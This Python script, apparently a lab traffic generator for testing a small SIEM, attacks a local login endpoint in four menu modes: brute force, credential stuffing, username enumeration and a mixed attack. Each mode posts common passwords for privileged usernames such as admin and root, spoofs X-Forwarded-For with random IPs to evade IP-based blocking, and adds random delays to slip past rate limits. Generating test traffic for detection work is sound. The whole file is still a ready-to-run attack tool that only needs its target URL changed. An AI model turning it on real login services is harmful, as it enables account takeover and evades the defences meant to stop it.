import requests
import random
import time

TARGET_URL = "http://127.0.0.1:5000/login"

def generate_random_ip():

    return ".".join(
        str(random.randint(1, 254))
        for _ in range(4)
    )

def generate_username():

    usernames = [
        "admin",
        "administrator",
        "root",
        "support",
        "manager",
        "finance",
        "guest",
        "user",
        "test"
    ]

    return random.choice(usernames)

passwords = [
    "1234",
    "password",
    "admin",
    "welcome",
    "qwerty",
    "test123",
    "wrongpass"
]

def send_request(username, password, ip):

    response = requests.post(
        TARGET_URL,
        data={
            "username": username,
            "password": password
        },
        headers={
            "X-Forwarded-For": ip
        },
        proxies={
        "http": None,
        "https": None
    }
    )

    print(
        f"IP={ip} | USER={username} | PASS={password}"
    )

    return response

def brute_force():

    print("\n=== BRUTE FORCE MODE ===\n")

    ip = generate_random_ip()

    while True:

        username = "admin"
        password = random.choice(passwords)

        response = send_request(
            username,
            password,
            ip
        )

        if "Login Successful" in response.text:

            print("\nSUCCESS LOGIN")
            break

        time.sleep(random.uniform(0.5, 2))

def credential_stuffing():

    print("\n=== CREDENTIAL STUFFING MODE ===\n")

    username = "admin"

    while True:

        ip = generate_random_ip()

        password = random.choice(passwords)

        response = send_request(
            username,
            password,
            ip
        )

        if "Login Successful" in response.text:

            print("\nSUCCESS LOGIN")
            break

        time.sleep(random.uniform(0.5, 2))

def username_enumeration():

    print("\n=== USERNAME ENUMERATION MODE ===\n")

    ip = generate_random_ip()

    while True:

        username = generate_username()

        response = send_request(
            username,
            "wrongpassword",
            ip
        )

        if "Login Successful" in response.text:

            print("\nSUCCESS LOGIN")
            break

        time.sleep(random.uniform(0.5, 2))

def mixed_attack():

    print("\n=== MIXED ATTACK MODE ===\n")

    while True:

        ip = generate_random_ip()

        username = generate_username()

        password = random.choice(passwords)

        response = send_request(
            username,
            password,
            ip
        )

        if "Login Successful" in response.text:

            print("\nSUCCESS LOGIN")
            break

        time.sleep(random.uniform(0.5, 2))

while True:

    print("\n==============================")
    print(" MINI SIEM ATTACK SIMULATOR ")
    print("==============================")
    print("1. Brute Force")
    print("2. Credential Stuffing")
    print("3. Username Enumeration")
    print("4. Mixed Attack")
    print("5. Exit")

    choice = input("\nSelect attack mode: ")

    if choice == "1":

        brute_force()

    elif choice == "2":

        credential_stuffing()

    elif choice == "3":

        username_enumeration()

    elif choice == "4":

        mixed_attack()

    elif choice == "5":

        print("Goodbye!")

        break

    else:

        print("Invalid Choice")